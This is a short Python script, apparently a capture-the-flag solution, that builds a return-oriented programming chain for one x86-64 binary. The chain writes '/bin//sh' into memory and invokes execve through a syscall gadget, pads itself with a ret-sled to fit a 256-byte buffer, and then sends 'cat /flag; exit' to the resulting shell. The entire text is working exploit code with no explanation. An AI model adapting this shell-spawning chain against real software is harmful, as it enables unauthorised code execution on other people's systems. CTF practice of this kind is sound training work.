from struct import pack

nop = pack('<Q', 0x0000000000400416) # ret

p = pack('<Q', 0x0000000000410a73) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415ee4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f4d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410a73) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000445440) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f4d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410a73) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x000000000044a105) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000415ee4) # pop rax ; ret
p += pack('<Q', 0x3b)
p += pack('<Q', 0x0000000000474ec5) # syscall ; ret

max_size = 256

payload = "257" + " "*6

payload += nop * ((max_size - len(p)) / len(nop))
payload += p
payload += '\x00'

payload += "cat /flag; exit\n"

print(payload)
